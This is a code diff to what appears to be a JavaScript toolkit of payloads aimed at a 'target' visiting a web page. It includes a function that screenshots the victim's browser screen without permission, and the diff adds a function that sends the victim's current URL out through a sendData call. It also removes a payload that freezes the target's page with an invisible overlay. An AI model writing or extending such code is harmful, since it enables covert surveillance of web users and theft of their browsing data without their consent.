@@ -30,6 +30,10 @@ const utils = [
     name: "Screenshot",
     description: "Takes the screenshot of the user's browser screen (whatever they are looking at), and saves it in your system. Works WITHOUT ANY PERMISSIONS!!!",
     func: () => {
+      document.addEventListener('DOMContentLoaded', function() {
+        // your code here
+     }, false);
+     
       html2canvas(document.body, {
         allowTaint: true,
         useCORS: true,
@@ -71,17 +75,14 @@ const utils = [
   },
 
 
-  
+
   {
-    name: "Handicapped",
-    description: "Removes all fucntionality of the target's page, leaves them with a static page.",
-    func: () => {
-      document.body.innerHTML += `
-      <div style='width:100vw; height:100vh; background-color:transparent; z-index:2000; position:absolute; top:0px; left:0px;'>
-      `
-      
+    name: "Get URL",
+    description: "Gets the URL of the page target visits",
+    func: async () => {
+      await sendData(window.location.href);
     }
-  }
+  },
 ]
 
 module.exports = utils
